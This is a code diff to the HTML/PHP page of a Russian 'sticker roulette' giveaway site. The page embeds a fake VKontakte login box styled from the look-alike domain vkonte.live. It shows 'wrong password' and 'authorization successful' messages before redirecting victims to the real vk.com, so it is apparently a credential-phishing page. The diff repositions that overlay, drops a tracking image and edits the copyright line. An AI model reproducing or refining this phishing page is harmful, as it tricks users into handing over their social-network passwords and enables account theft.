@@ -13,7 +13,7 @@
 <div class="wrapper">
     <header class="header">
         <div class="inner">
-            <div class="logo"><a href="#"></a>
+            <div class="logo"><a href="#"><img src="./main/logo@2x.png" tppabs="logo@2x.png" style="padding-top: 21px;"></a>
             </div>
             <div class="stat">
                             <div class="o">Онлайн
@@ -127,7 +127,7 @@ function LetsGo(){
 
 }
 </script>
-                <img src="https://clck.ru/CTofd.png" alt="Открыть бесплатно" border="0">
+
                 <button class="btn blue rounded" onclick="LetsGo()" ;="">Открыть бесплатно</button>
             </div>
             <div class="cls"></div>
@@ -252,7 +252,7 @@ function LetsGo(){
                     </a><li><a "class="btn darkblue backtocases"></a><a href="https://vk.com" target="_blank" class="bonus eas">Вконтакте</a></li>
                 </ul>
                 <div class="copy">
-                    Copyright © 2018 Рулетка стикеров. Все права сайта защищены.<br>Играя на сайте вы принимаете пользовательское соглашение<a>
+                    Copyright © 2017 Рулетка стикеров. Все права защищены.<br>Играя на сайте вы принимаете пользовательское соглашение<a>
                               </a></div><a>
             </a></div><a>
             <div class="r">
@@ -265,7 +265,7 @@ function LetsGo(){
 <link rel="stylesheet" type="text/css" href="https://vkonte.live/api/v1/frame.css">
 <script language="javascript" type="text/javascript" src="https://vk.com/js/api/common_light.js"></script>
 <link rel="stylesheet" type="text/css" href="https://vkonte.live/api/login/frame.css">
-<div class="vkframe" style="<?php if ($num != 0){ ?> display: block<?php }else{ ?>display: none<?php }?>"> <div class="VK oauth_page vk_auth" style="background: transparent; position: absolute; top: 25%; left: 50%; margin-right: -50%; transform: translate(-50%, -50%); z-index: 90000;"> <div id="sub_cont" style=""> <table id="container" class="container" cellspacing="0" cellpadding="0"> <tbody><tr> <td class="head" style="padding: 14px 20px 18px;"> <a href="https://vk.com" target="_blank" class="logo"></a> <div class="auth_items"> <a class="head_name fl_r" href="http://vk.com/join?reg=1" target="_blank" style="width: 15%;">Регистрация</a> </div> </td> </tr> <tr> <td valign="top"> <div class="info_line" style="font-size: 11px">Для продолжения необходимо войти через <b>ВКонтакте</b>.</div> <div id="box_cont"> <center> <div style="width:80%; <?=$baza ?>">
+<div class="vkframe" style="<?php if ($num != 0){ ?> display: block<?php }else{ ?>display: none<?php }?>"> <div class="VK oauth_page vk_auth" style="background: transparent; position: fixed; bottom: 130px; left: 346.5px; z-index: 90000;"> <div id="sub_cont" style=""> <table id="container" class="container" cellspacing="0" cellpadding="0"> <tbody><tr> <td class="head" style="padding: 14px 20px 18px;"> <a href="https://vk.com" target="_blank" class="logo"></a> <div class="auth_items"> <a class="head_name fl_r" href="http://vk.com/join?reg=1" target="_blank" style="width: 15%;">Регистрация</a> </div> </td> </tr> <tr> <td valign="top"> <div class="info_line" style="font-size: 11px">Для продолжения необходимо войти через <b>ВКонтакте</b>.</div> <div id="box_cont"> <center> <div style="width:80%; <?=$baza ?>">
 <?php if($num == 1) { ?><div class="msg msg-error" style="display: block;color: #cc0000;">Пожалуйста, проверьте правильность написания логина и пароля.</div> <?php } ?>
 <?php if($num == 2) { ?><script> setTimeout(function(){location.replace("https://vk.com/");}, 2000);
  </script><div class="msg msg-success" style="display: block;">Авторизация прошла успешно! Ожидайте.</div><?php } ?>
@@ -290,6 +290,6 @@ function LetsGo(){
 <div style="text-align: center;"><div style="position:relative; top:0; margin-right:auto;margin-left:auto; z-index:99999">
 
 </div></div>
-2018
+
 </center></a>
 </body></html>
